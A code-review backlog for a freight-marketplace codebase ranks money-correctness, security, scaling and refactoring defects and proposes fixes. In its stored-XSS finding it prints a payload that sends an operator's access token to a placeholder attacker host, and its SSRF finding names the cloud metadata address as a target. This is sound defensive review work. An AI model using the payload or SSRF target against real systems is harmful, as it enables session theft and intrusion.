# naviG8r improvement backlog

Findings from a full read of the repository, ranked by consequence.

**How to read this.** Every finding below was confirmed by opening the cited file. Each states
the defect, a concrete failure scenario, and a specific change. Nothing here is a style
preference — where something is a matter of taste it is marked as such and put at the bottom.

**Nothing in this document has been fixed.** This pass is documentation only. Several findings
overlap with the open draft PRs (#82–#98) that nobody has reviewed; those are noted inline.

Verified against commit `0fc4ad0`. Test suite: 53/53 passing (47 API + 6 core) on Node 24.

---

## Critical — money correctness and data loss

### C1. A queued RazorpayX payout is recorded as PAID and can never be corrected

`services.ts:1882-1899`. The payout batch maps RazorpayX statuses to three outcomes:
`processed`/`completed` → PAID, `rejected`/`cancelled`/`reversed` → FAILED (lines stay
`ACCRUED` to retry), **everything else → `PROCESSING`, and the ledger lines are marked `PAID`
anyway.** The code says so plainly:

```
// PROCESSING or PAID: mark lines PAID (queued/processing payouts are in-flight, not reversible here).
for (const l of lines) store.ledgerLines.set(l.id, { ...l, status: "PAID", paidAtUtcMs: now });
```

There is **no RazorpayX payout webhook handler anywhere** — `razorpayWebhook.ts` handles only
`payment.authorized`, `payment.captured` and `payment.failed`, all customer-side. And no code
path ever moves a `LedgerLine` from `PAID` back to `ACCRUED`.

**Failure scenario:** a payout is created with status `queued`. The ledger marks the carrier
paid. The bank later rejects it — wrong account, insufficient balance in the RazorpayX source
account. Nothing tells the system. The carrier is recorded as settled, has no money, and there
is no report that would surface the discrepancy.

**Not currently live** — production runs `PAYOUTS_MODE=BOOKKEEPING`. But this is precisely the
switch the roadmap intends to flip.

**Fix:** treat `PROCESSING` as not-yet-paid (add a `PENDING` ledger state, or leave lines
`ACCRUED` with the transfer recorded), and add a RazorpayX payout webhook to settle or revert.
Until then, a reconciliation query comparing `PayoutTransfer` records against RazorpayX is the
minimum.

### C2. `PERSISTENCE=DB` silently discards the entire ERP integration subsystem

The store holds 18 collections (`store.ts:24-41`). `persistenceDb.ts` handles 13. The five it
never touches are `integrationConnections`, `integrationApiKeys`, `integrationIdempotency`,
`integrationEvents` and `integrationWebhookDeliveries` — the whole ERP feature. `grep -c
integration apps/api/src/persistenceDb.ts` returns 0; the same grep on `persistence.ts` returns
25. There are no Prisma models for any of them.

**Failure scenario:** switch to Postgres, redeploy. Every partner's API key stops working,
every webhook subscription is gone, idempotency records vanish so replayed ERP loads
double-book, and the pending delivery outbox is lost. No error is raised.

**Not currently live** — `render.yaml` sets `DATA_FILE` and never sets `PERSISTENCE=DB`, so
production is on the file store and this data is durable there today. It is a landmine on the
path roadmap section A is walking toward.

**Fix:** add the five Prisma models and their load/save, or fail startup loudly when
`PERSISTENCE=DB` is set while integration connections exist.

### C3. A redelivered `payment.captured` webhook can resurrect a refunded payment

`razorpayWebhook.ts:60-73`. The `payment.authorized` handler guards its source state
(`if (pay.status === "AUTHORIZED" || pay.status === "CAPTURED") return;`) and so does
`payment.failed` (`if (pay.status === "CAPTURED" || pay.status === "REFUNDED") return;`).
**`payment.captured` has no such guard** and writes `status: "CAPTURED"` unconditionally.

**Failure scenario:** a shipment fails, `failCarrierAndRefund` sets the payment to `REFUNDED`.
Razorpay redelivers the earlier `payment.captured` event — which it does on any non-2xx, and
ordering is not guaranteed. The payment flips back to `CAPTURED` while the shipment reads
`FAILED_CARRIER_REFUNDED`. The customer's money was returned; the ledger says it was taken.

**Fix:** one line, mirroring the siblings — `if (pay.status === "REFUNDED") return;`

### C4. Abandoned bookings permanently consume trip capacity

`services.ts:1239` reserves capacity the moment `bookShipment` runs — before the carrier
accepts and before payment is authorized. `reservedKg` is decremented in exactly two places:
`rollbackBooking` (`:1678`, only when Razorpay order creation fails) and `failCarrierAndRefund`
(`:1792`). There is no expiry, no timeout, and no sweeper for a shipment left in
`PENDING_CARRIER_ACCEPT`.

**Failure scenario:** a customer starts a booking and abandons checkout. The capacity is gone
for good. Repeat it and a trip reaches `FULL` with no paying customers — a carrier's truck runs
empty. Done deliberately with an unauthenticated `POST /shipments/book`, it is a denial of
service against every open trip on the marketplace.

**Fix:** expire `PENDING_CARRIER_ACCEPT` shipments whose payment is not `AUTHORIZED` within a
window (15 minutes is conventional for held inventory), releasing capacity. Add an ops endpoint
to release a specific booking manually in the meantime.

---

## High — security

### H1. `ALLOW_X_USER_ID` is an unauthenticated impersonation switch with no production guard

`httpServer.ts:283-291`. When `ALLOW_X_USER_ID=1`, `requireUserId` returns the `x-user-id`
header directly — no signature, no session lookup, no expiry check — before it ever considers
the bearer token. It fronts roughly 20 authenticated routes.

The sharp edge is an inconsistency right next to it. There are **two** identity helpers:

| Helper | Honors the bypass? | Used by |
|---|---|---|
| `requireBearerUserId` (`:326`) | No — goes straight to `verifyBearer` | `/ops/shipments/*`, `/ops/.../release` |
| `requireUserId` (`:283`) | **Yes** | `POST /payout-batches/run`, `GET /payout-batches`, and the pilot routes |

So the ops *release* endpoints are protected from the bypass, but `POST /payout-batches/run` —
the endpoint that moves real money under `PAYOUTS_MODE=RAZORPAYX` — is not.

Unlike the legacy demo surface beside it, this flag is **not** gated on `NODE_ENV`. It is off by
default and absent from `render.yaml`, so it is not currently live.

**Fix:** gate it on `NODE_ENV !== "production"` at minimum. Better: delete it and use a seeded
test token in tests. Then collapse the two helpers into one so the safe behaviour is the only
behaviour.

### H2. Stored XSS in the ops portal via customer organization name

`httpServer.ts:232` and `:245`. The ops portal builds its tables by string concatenation into
`innerHTML` with no escaping:

```
return "<tr><td><code>" + s.id + "</code></td><td>" + (s.customerOrgName||"") + ...
```

`customerOrgName` is supplied by the customer at booking. The `/admin` route defines a local
`esc()` helper (`:861-866`); the ops portal defines nothing.

**Failure scenario:** a customer registers an org named
`<img src=x onerror="fetch('//attacker/'+localStorage.access_token)">`. An operator opens
`/ops`, and the operator's bearer token — which carries ops-admin rights, including payout
authority — is exfiltrated. This is privilege escalation from customer to operator.

The `/ops` *data* endpoints are correctly protected (`requireBearerUserId` plus
`assertOpsAgent`), so this is not an open data leak; the payload fires in an authenticated
operator's browser. `/ops` does serve its HTML shell unauthenticated in production, unlike
`/admin`.

Already found by **open draft PR #87**, which nobody has reviewed.

**Fix:** use `textContent` and DOM construction, or hoist the existing `esc()` to module scope
and apply it to every interpolated field.

### H3. No OTP rate limiting, and no SMS delivery at all

`auth.ts`. `pilotOtpVerify` compares the submitted code and throws on mismatch, leaving the
challenge `PENDING`. There is no attempt counter, no lockout, and no per-phone throttle on
`pilotOtpStart`. The only rate limiting anywhere in the codebase is webhook retry backoff.

A six-digit code with a ten-minute window and unlimited attempts is brute-forceable.

Compounding this, no SMS provider is integrated. `types.ts:85` says so: *"Pilot OTP challenge
(mock SMS). Replace with real SMS + rate limits in production."* With `OTP_DEBUG=0`, which
`render.yaml` sets, codes are generated and never delivered — nobody can log in. With
`OTP_DEBUG=1`, `/v1/auth/otp/start` returns the code to any unauthenticated caller who knows a
phone number, which is account takeover by design.

**This is the single thing blocking a real pilot.** Neither setting supports onboarding a user.

**Fix:** integrate an Indian SMS provider (MSG91, Kaleyra and Gupshup are the usual choices for
DLT-registered transactional SMS), add a failed-attempt counter that expires the challenge after
5 tries, and throttle `otp/start` per phone.

### H4. Sessions cannot be revoked, because nothing ever revokes them

`AuthSession.revokedAtUtcMs` is initialised to `null` (`auth.ts:145`) and checked on every
verify (`auth.ts:158`), but **no code path anywhere sets it**. There is no logout endpoint and
no revoke endpoint.

The server-side session lookup is the right design — it is what makes revocation *possible*,
unlike a stateless JWT. The mechanism is simply unused.

**Failure scenario:** a driver's phone is stolen. The token is valid for its full 30-day
lifetime. The only remedy is rotating `AUTH_SECRET`, which also invalidates every other user's
session and every ERP partner's API key.

**Fix:** add `POST /v1/auth/logout` that sets `revokedAtUtcMs`, and an ops endpoint to revoke a
user's sessions.

### H5. No SSRF protection on partner webhook URLs

`integrationServices.ts:96-101` validates a webhook URL only by requiring an `https://` prefix,
and only when `NODE_ENV === "production"`. There is no private-address check anywhere.
`integrationWebhooks.ts:253` then `fetch`es it from inside the API process.

**Failure scenario:** a customer with portal access sets their webhook to
`https://169.254.169.254/latest/meta-data/` or an internal `10.x` address. The API fetches it
and records the response status and up to 500 characters of the body in the delivery log, which
the customer can read back through the portal.

**Fix:** resolve the hostname and reject private, loopback, link-local and metadata ranges
before the first delivery and again at fetch time.

### H6. Webhook signatures have no timestamp, so deliveries can be replayed forever

`integrationAuth.ts:91` signs the payload body alone into `x-navig8r-signature`. Nothing binds
the signature to a moment in time and there is no nonce.

**Failure scenario:** a partner logs a delivery, or it is captured in transit at their edge.
The signed request stays valid indefinitely and can be replayed into the partner's endpoint to
duplicate a `load.delivered` event.

**Fix:** follow the Stripe and Svix convention — sign `${timestamp}.${body}`, send the timestamp
in the header, and document that receivers must reject timestamps outside a tolerance window.
This is a breaking change to the partner contract, so do it before the first real ERP partner
rather than after.

### H7. Anonymous shipments are visible to anyone who registers a matching organization name

`services.ts:309-314`. Shipment ownership falls back to a **free-text name comparison** when no
org id is set:

```
export function shipmentBelongsToCustomerOrg(shipment: Shipment, org: Organization): boolean {
  if (shipment.customerOrgId != null && shipment.customerOrgId !== "") {
    return shipment.customerOrgId === org.id;
  }
  return shipment.customerOrgName === org.displayName;
}
```

`customerOrgName` is a string the booker types at `POST /shipments/book`. `customerOrgId` is set
only when the booking carried a valid bearer token, so every anonymous booking is matched by
name alone.

Nothing prevents duplicate organization names. `registerCustomerOrgAdmin` (`:500`) rejects a
duplicate *phone* but never checks `displayName`, and `schema.prisma` declares no `@unique` on
it.

**Failure scenario:** an attacker registers a customer org with `displayName` set to a target
company's exact name. `GET /shipments` then returns that company's anonymous bookings —
pickup and drop addresses, weights, prices, and live tracking.

**This compounds with M1.** A real customer whose 30-day session has lapsed books "anonymously"
without being told, so their shipment is tagged by name only and becomes readable by anyone who
claims that name.

**Fix:** drop the name fallback and match on `customerOrgId` alone. For genuinely anonymous
bookings the phone linkage (`bookedByPhone`, already present and verified by OTP) is the correct
mechanism. Add a uniqueness constraint on customer org display names regardless.

### H8. Carriers can read every other carrier's settlement amounts

`services.ts:779-787`. `pilotListCarrierPayoutBatches` authorizes the caller for the requested
org correctly (`assertPilotDriverCanManageOrg`) and correctly selects the batches containing that
carrier's ledger lines. Then it returns the **entire `PayoutBatch` object**.

A `PayoutBatch` carries `transfers[]`, and `runPayoutBatch` pushes one entry per carrier in the
batch with `carrierId`, `netToCarrierPaise` and `providerPayoutId` — plus a batch-wide
`totalNetToCarrierPaise`.

**Failure scenario:** a carrier opens the payout history screen in the driver app. The response
contains what every other carrier in that weekly batch was paid. In a marketplace where carriers
compete for the same lanes, that is commercially sensitive information about rivals' volumes and
rates.

Already found by **open draft PR #98**, which nobody has reviewed.

**Fix:** project the batch before returning it — keep `id`, `cutoffUtcMs`, `createdAtUtcMs` and
the caller's own transfer and line ids, and drop everyone else's.

---

## High — scale and availability

### S1. In DB mode, every write deletes and re-inserts the entire database

`persistenceDb.ts:279-293`. `saveStoreToDatabase` opens one interactive transaction, calls
`deleteMany()` on all 13 tables, then re-creates every row with individual `create()` calls.
`persist()` runs after every mutating request.

**Failure scenario:** at 1,000 shipments, a single booking deletes and rewrites every user,
membership, trip, shipment, payment and ledger line. Latency scales with total data, not with
the change. Concurrent requests serialise on the transaction, and any failure rolls back the
whole store.

This is the mode roadmap section A is moving toward, so it will be hit.

**Fix:** write only what changed. The store already knows which entity a handler touched, so
targeted `upsert` calls are a mechanical change from here.

### S2. The payout runner writes an empty batch row every 60 seconds, forever

`services.ts:1825-1839` creates and stores a `PayoutBatch` even when nothing is eligible —
deliberately, per the comment *"Still create an empty batch for determinism in MVP."* The
background timer (`index.ts:27`) calls it every 60 seconds.

That is 1,440 rows per day and roughly 526,000 per year. The timer skips `persist()` when the
batch is empty, but the next unrelated write flushes them all to disk, and file-mode persistence
re-serialises the entire store on every write.

**Failure scenario:** after a few months of quiet running, `store.json` is dominated by empty
payout batches and every booking pays to re-serialise them.

**Fix:** return the empty batch without storing it, or store it only when `lineIds.length > 0`.
The determinism the comment wants is satisfied by the return value.

### S3. Nothing prunes OTP challenges, sessions, or integration events

OTP challenges are status-flipped to `CONSUMED` or `EXPIRED` and never deleted, with the code
stored in plaintext. Auth sessions accumulate for 30 days each and are never removed. Integration
events and webhook deliveries have no retention policy.

Combined with S2 and the full-store serialize, the store only grows.

**Fix:** a sweeper that deletes consumed and expired OTP challenges, sessions past expiry, and
integration events older than a retention window.

### S4. The API cannot be scaled horizontally as written

`index.ts:27` and `:45` start two `setInterval` loops in-process, neither with a re-entrancy
guard. Both mutate shared state.

Two problems, either of which is enough:

1. **Two instances means two payout runners** on the same ledger. Draft PR #85, unreviewed, is
   titled "Fix concurrent RazorpayX payout double-pay".
2. **Even one instance overlaps with itself.** Webhook delivery is sequential
   (`integrationWebhooks.ts:274-297`) with a 30-second timeout each. Ten dead endpoints take 300
   seconds, so the 30-second timer fires ten more times during one run, delivering duplicates.

**Fix:** an `isRunning` flag on each timer is the ten-minute version and fixes the overlap.
Multi-instance safety needs the work to move behind a lock or an external scheduler — worth
deciding before anyone raises the Render instance count.

### S5. Every domain query is a full scan, and the Prisma schema has no indexes

Lookups such as `findUserByPhone` (`auth.ts:76`) and `findActiveKey`
(`integrationAuth.ts:39-47`) iterate the entire collection on every request — the latter also
computing a SHA-256 per key. `schema.prisma` declares no `@@index` and no `@unique` beyond
primary keys.

At pilot scale this costs nothing and needs no action. It is recorded because the fix is cheap
once volume arrives, and because the missing `@unique` on `User.phone` is a correctness gap as
much as a performance one — nothing at the database level stops two users sharing a phone
number.

---

## Medium

### M1. An expired token makes a booking silently anonymous

`httpServer.ts:1377-1388`. `POST /shipments/book` wraps `verifyBearer` in a `try` and, on any
failure, proceeds with anonymous booking. Anonymous booking is a real feature, so the catch is
intentional — but it does not distinguish "no token supplied" from "token expired".

**Failure scenario:** a customer's 30-day session lapses. They book. They get a success screen.
The shipment carries no `customerOrgId` and no `bookedByUserId`, so it never appears in their
`GET /shipments` list. From their side the booking vanished, and support has no way to find it
except by phone number.

**Fix:** if an `Authorization` header is present but invalid, return 401. Fall through to
anonymous only when no header was sent.

### M2. Trip capacity uses floating-point equality to detect FULL

`services.ts:1240`: `if (trip.reservedKg === trip.capacityKg) trip.status = "FULL";`
`weightKg` is validated only as `> 0` (`:1211`), so fractional weights are accepted and
`reservedKg` accumulates floating-point error.

The release path at `:1679` correctly uses `<`. Only the FULL transition uses `===`.

**Failure scenario:** a 1,000 kg trip books ten 33.3 kg parcels and the rest in fractions.
`reservedKg` lands on 999.9999999999999. The trip never flips to `FULL` and keeps appearing in
marketplace listings with a remaining capacity of roughly zero, so every further booking attempt
fails with `insufficient_capacity` instead of the trip being hidden.

**Fix:** `>=` instead of `===`. Better, store weight in integer grams, matching the decision
already taken for money.

### M3. Webhook tracking URLs point at a hostname that is not the live portal

`integrationWebhooks.ts:70` defaults `CUSTOMER_WEB_BASE_URL` to
`https://navig8r-customer-web.onrender.com`. The marketing site links the portal at
`https://navig8r-customer.onrender.com` (`apps/www/src/main.js:1`), and PR #92 —
"Fix Explore CTA URL (drop -web)" — deliberately moved it there. `CUSTOMER_WEB_BASE_URL` is not
set in `render.yaml`, so the default is what partners receive.

There are three hostnames in the tree for two services.

**Fix:** set `CUSTOMER_WEB_BASE_URL` in `render.yaml` and confirm which host actually serves the
portal.

### M4. Nothing typechecks the codebase

`tsconfig.json` sets `strict: true` and `noEmit: true`, but no script, Dockerfile step, or CI job
ever runs `tsc`. `grep -rn tsc package.json apps/*/package.json Dockerfile` returns nothing. The
app runs via `--experimental-strip-types`, which **strips** types without checking them.

**Failure scenario:** a type error ships. The strict settings are decorative today.

**Fix:** add `"typecheck": "tsc --noEmit"` and run it in CI. Expect a first run to surface real
errors.

### M5. No CI runs the 53 passing tests

There is no `.github/` directory. The test suite is good and it is enforced only by whoever
remembers.

**Fix:** the highest value-per-effort change in this document.

```yaml
# .github/workflows/ci.yml
name: CI
on:
  pull_request:
  push:
    branches: [main]

jobs:
  api:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - run: npm install --prefix apps/api
      - name: Typecheck
        run: npx tsc --noEmit
      - name: Test
        run: node --experimental-strip-types --test "packages/**/src/**/*.test.ts" "apps/**/src/**/*.test.ts"

  flutter:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: subosito/flutter-action@v2
        with:
          flutter-version: '3.22.3'
      - run: flutter pub get
        working-directory: apps/driver_pilot
      - run: flutter analyze
        working-directory: apps/driver_pilot
      - run: flutter test
        working-directory: apps/driver_pilot
```

What this does not catch: anything behind `PERSISTENCE=DB` (no Postgres service), the Razorpay
paths (no test credentials), and the marketing site (no tests exist).

### M6. Node 22+ is mandatory and nothing says so

`--experimental-strip-types` does not exist before Node 22.6. On Node 20 — still a widely
installed LTS — the API fails with `node: bad option: --experimental-strip-types` and no hint.
There is no `engines` field and no `.nvmrc`.

**Fix:** add `"engines": { "node": ">=22.6" }` to the root `package.json` and a `.nvmrc`
containing `22`.

### M7. No `.env.example`, for roughly 25 load-bearing variables

The only record of what must be configured is scattered across `render.yaml` comments and prose
docs. A new contributor cannot start the API without reading several files.

**Fix:** commit a `.env.example` listing every variable with a safe placeholder and a one-line
comment. The table in the README is a ready-made source.

### M8. The generated `web/index.html` is tracked and is the file the key is injected into

`scripts/inject-maps-api-key.sh` rewrites `apps/driver_pilot/web/index.html` from
`index.template.html`, substituting the real `MAPS_API_KEY`. Both files are tracked, and
`.gitignore` excludes neither. They are currently identical, so no key is committed today.

**Failure scenario:** a developer runs the script locally to test Maps, then commits. A Google
Maps API key enters git history.

**Fix:** add `apps/driver_pilot/web/index.html` to `.gitignore` and remove it from tracking.

### M9. Generated Flutter files are tracked

`.flutter-plugins`, `.flutter-plugins-dependencies`, `driver_pilot.iml` and
`android/driver_pilot_android.iml` are machine-generated and regenerate differently per machine.
Flutter's own `.gitignore` template excludes them.

**Consequence:** avoidable merge conflicts on files nobody edits.

### M10. CORS omits the ERP integration's own auth headers

`httpServer.ts:104` sets `Access-Control-Allow-Headers: content-type, authorization,
x-razorpay-signature`. The integration endpoints read `x-api-key` and `x-api-secret`
(`integrationHttp.ts:76-77`), which are therefore blocked by preflight from any browser origin.

Low severity — ERP integration is server-to-server, where CORS does not apply. Worth fixing
before anyone builds a browser-based partner console.

### M11. `main.dart` calls `setState` after `await` without `mounted` guards

`main.dart` has 50 `setState` calls and 7 `mounted` checks against 16 awaits. `LoginScreen`
alone does it at lines 482, 491, 493, 517, 522 and 527. `driver_flow.dart` (54 guards) and
`customer_flow.dart` (47 guards) are much better disciplined.

**Failure scenario:** a user taps back while an OTP request is in flight; `setState` fires on a
disposed widget and throws.

**Fix:** this code is the legacy pilot-lab surface — see R3. Deleting it resolves this finding
entirely.

---

## Structural refactors

These are the largest files. Each proposal names the new files, what moves, and **what gets
harder** — a split with no stated cost has not been thought through. None of these should be
done while other work is in flight; they conflict with everything.

### R1. Split `services.ts` (1,936 lines, ~66 exports) along its real seams

One file currently holds onboarding, ops administration, geofencing, pricing, booking, capacity,
delivery, refunds, tracking and payouts. It fails the one-sentence test badly.

Rather than a mechanical split, take the seams where coupling is genuinely low:

| New file | What moves | Lines |
|---|---|---|
| `domain/pricing.ts` | `computeFreightGrossPaise`, `quoteShipmentMarketplace`, `pilotRatesEstimate`, `FreightBreakdown` | ~1005-1188 |
| `domain/payouts.ts` | `runPayoutBatch`, ledger helpers, `pilotListCarrierLedger`, payout-batch listing | ~1819-1936, ~772-790 |
| `domain/identity.ts` | org/user/membership creation, ops-admin grant and revoke, visibility predicates | ~190-612 |
| `domain/delivery.ts` | `submitDriverPod`, `markPodDelivered`, `releasePaymentAndDeliver`, `failCarrierAndRefund` | ~1345-1410, 1600-1818 |
| `services.ts` (remainder) | trips, booking, capacity, tracking | the rest |

`domain/pricing.ts` is the cleanest and safest first move: it is pure, takes no `Store`, and is
already covered by `freight.test.ts`. **Do that one alone first** and see whether the rest earns
its disruption.

**What gets harder:** shared helpers (`nowUtcMs`, `id`, `moneySplit`, `haversineKm`) need a
`domain/shared.ts`, adding an import hop. And because every function takes `Store`, the files
stay coupled through the store type — the split improves navigation, not decoupling. Do not
expect it to reduce complexity, only to make it findable.

### R2. Extract the portal HTML out of `httpServer.ts` (1,602 lines)

Roughly 420 lines of the file are template-literal HTML and browser JavaScript for `/admin` and
`/ops`. They are not server logic and they defeat editor tooling — the XSS in H2 survived
partly because it is JavaScript inside a string inside a route handler.

**Step one, low risk and high payoff:** move the two documents into `apps/api/src/portals/
adminHtml.ts` and `opsPortalHtml.ts`. This alone drops `httpServer.ts` by a quarter and puts the
XSS fix somewhere a reviewer will look.

**Step two, only if step one proves out:** group routes into `routes/auth.ts`, `routes/pilot.ts`,
`routes/marketplace.ts`, `routes/ops.ts` and `routes/legacy.ts`.

**What gets harder, and it is significant:** the router is a linear if-chain where **order is
load-bearing**. Splitting the chain across files makes that ordering invisible and easy to break
silently. If step two happens, replace the chain with an explicit ordered route table in the same
commit. Do not split the chain and keep the if-chain semantics.

### R3. Delete the legacy "pilot lab" surface from `main.dart`

`main.dart` (1,151 lines) contains `PilotScaffold`, `HomeScreen`, `RegisterScreen`,
`LoginScreen`, `MyTripsScreen`, `TripDetailScreen` and `PublishTripScreen` — a complete second
generation of the driver experience, routed at `/pilot-lab`, `/register`, `/trips` and
`/publish`, and reachable from neither the driver nor the customer shell (the app starts at
`/driver` or `/customer`).

They duplicate `DriverRegisterScreen`, `DriverPhoneScreen`, `DriverOtpScreen`,
`DriverShipmentsScreen`, `DriverShipmentDetailScreen` and `DriverPublishTripScreen`.

**This is the highest-value refactor in the document** — it is a deletion, not a restructure. It
removes roughly 900 lines, eliminates the risk of fixing a bug in the wrong copy, and resolves
M11 outright. `main.dart` becomes about 150 lines of bootstrap and router.

**Check first:** confirm nobody is using `/pilot-lab` for demos, and keep `/login`, which the
customer flow redirects through.

**What gets harder:** nothing, if the routes are genuinely unused. Verify before deleting.

### R4. Split the two 2,000-line Flutter screen files by journey

`driver_flow.dart` (2,221 lines, 18 screens) and `customer_flow.dart` (2,149 lines, 13 screens).

Both are cohesive in the sense that everything in them belongs to one persona — but neither can
be described without listing six journeys, and the practical cost is real: in
`customer_flow.dart`, `CustomerRegisterScreen` is declared at line 472 while its state class
`_CustomerRegisterScreenState` sits at line 1083, with the 378-line integrations screen wedged
between them.

| From | New files |
|---|---|
| `driver_flow.dart` | `driver/shell.dart`, `driver/onboarding.dart` (151-686), `driver/shipments.dart` (687-1199), `driver/trip.dart` (1200-1786), `driver/earnings.dart` (1787-2017), `driver/publish.dart` (2018-2221) |
| `customer_flow.dart` | `customer/shell.dart`, `customer/auth.dart`, `customer/team.dart`, `customer/integrations.dart` (704-1082), `customer/browse.dart`, `customer/booking.dart`, `customer/shipments.dart` |

**What gets harder:** the route lists (`driverFlowRoutes()`, `customerFlowRoutes()`) must import
from every new file, and private widgets currently shared within the file (`_LoadCard`,
`_StatTile`, `_ShipmentTimeline`) have to become public or move to a shared widgets file. Expect
the total line count to go up slightly.

**Do R3 before R4.** Deleting the legacy screens may reveal that some driver screens are shared,
which changes the boundaries.

---

## Quick wins

Each of these is under an hour and has real payoff.

| Fix | Why it earns the hour |
|---|---|
| Add `.github/workflows/ci.yml` (M5) | Nothing currently enforces 53 passing tests |
| `>=` instead of `===` in the FULL check (M2) | One character; prevents stuck trips |
| Guard `payment.captured` on `REFUNDED` (C3) | One line; prevents money-state corruption |
| Gate `ALLOW_X_USER_ID` on `NODE_ENV` (H1) | One condition; closes a total-impersonation switch |
| Stop storing empty payout batches (S2) | Two lines; stops 526k rows a year |
| Add `engines` and `.nvmrc` (M6) | Two lines; saves the next contributor an hour |
| `.gitignore` the generated `web/index.html` (M8) | One line; prevents an API key reaching git |
| Set `CUSTOMER_WEB_BASE_URL` in `render.yaml` (M3) | Three lines; partner tracking links resolve |
| Add `.env.example` (M7) | Copy the README table |

---

## What is already good

A review that only lists problems misleads. These are decisions worth keeping, and worth not
"fixing":

- **`packages/core/src/payoutSchedule.ts`** is the best code in the repository. The fixed
  `+05:30` offset is correct rather than lazy — India has never observed DST, the file says so,
  and the tests cover month overflow and cutoff rollover. Do not replace this with a timezone
  library.
- **The Razorpay inbound webhook is handled correctly.** The raw body is verified before
  `JSON.parse`, the comparison is timing-safe, and a missing secret fails closed with a 503.
- **Money is integer paise throughout**, and `moneySplit` floors the commission so rounding
  always favours the carrier. That is a deliberate, defensible default.
- **Integration API secrets are never stored in plaintext** — only as a salted SHA-256.
- **The webhook outbox pattern is the right architecture**, with sensible backoff and a
  `DEAD` terminal state rather than infinite retries.
- **The JSON store's write is atomic** (temp file then rename) and the format is versioned V1
  through V4 with real migrations.
- **Authorize-at-booking, capture-at-POD** is the correct ordering for freight, and the state
  machines encode it properly.
- **Flutter platform differences use conditional imports** rather than runtime branching, which
  is the idiomatic Dart mechanism.

---

## The open draft PR backlog

Thirty-plus draft PRs are open, the oldest from 10 July, none reviewed. Most of the volume is
noise, and it is hiding a handful of real fixes.

**PRs #65 through #80 are sixteen near-duplicate PRs**, titled "Fix critical ERP integration
state regressions" or a close variant, opened roughly daily. That is an automated agent
re-running the same analysis and opening a fresh PR each time rather than updating one. Whatever
it found, it found once.

**Suggested triage, oldest first:**

| PRs | Action |
|---|---|
| #65–#80 | Read the newest one (#80) only. If its fix is sound, take it and close #65–#79 as superseded. Then stop or rate-limit whatever opens these. |
| #81–#85, #87, #98 | Distinct findings, several confirmed independently below. Review individually. |
| #86, #89 | Documentation PRs (a PRD, an AGENTS.md). #86 overlaps the rewritten README in this PR — worth reconciling rather than merging both. |
| #93, #95, #96, #97 | Marketing site and build notes, small and self-contained. Quick to clear. |

**Where those PRs meet the findings in this document** — three were confirmed here by reading
the source independently, so they are real and worth taking seriously:

| PR | Finding here | Confirmed |
|---|---|---|
| #87 stored XSS in ops portal | H2 | Yes — `httpServer.ts:232`, `:245` |
| #98 carrier payout history leak | H8 | Yes — `services.ts:779` returns the whole batch |
| #85 concurrent RazorpayX payout double-pay | S4 | Yes — two unguarded timers, no re-entrancy flag |
| #84 OTP lockout, capacity NaN, phone squat | H3, M2, H7 | Related; not verified line-by-line against the PR |
| #83 checkout capacity leaks | C4 | Related; not verified line-by-line against the PR |
| #82 payout hijack, POD-before-start | H1, C1 | Related; not verified line-by-line against the PR |

The last three rows are title-level matches only. Read the PRs before assuming they fix what is
described here.

## Suggested order

1. **Unblock the pilot:** H3 (SMS and OTP rate limiting). Nothing else matters until a real user
   can log in.
2. **The quick wins table.** An afternoon, and it removes two money-correctness bugs and an
   impersonation switch.
3. **Triage the draft PR backlog** using the table above. Sixteen of them are duplicates; three
   contain fixes for findings confirmed here.
4. **H7**, the organization-name IDOR. It is a data-exposure bug between customers, and the fix
   is small.
5. **C1 and C4** before `PAYOUTS_MODE=RAZORPAYX` or any real capacity pressure.
6. **C2 and S1** before `PERSISTENCE=DB`. Postgres is not currently a safe switch.
7. **R3**, the deletion. Cheap, and it makes the Flutter code honest.
8. **R1 step one and R2 step one** — `domain/pricing.ts` and the portal HTML extraction — then
   reassess whether the rest is worth it.
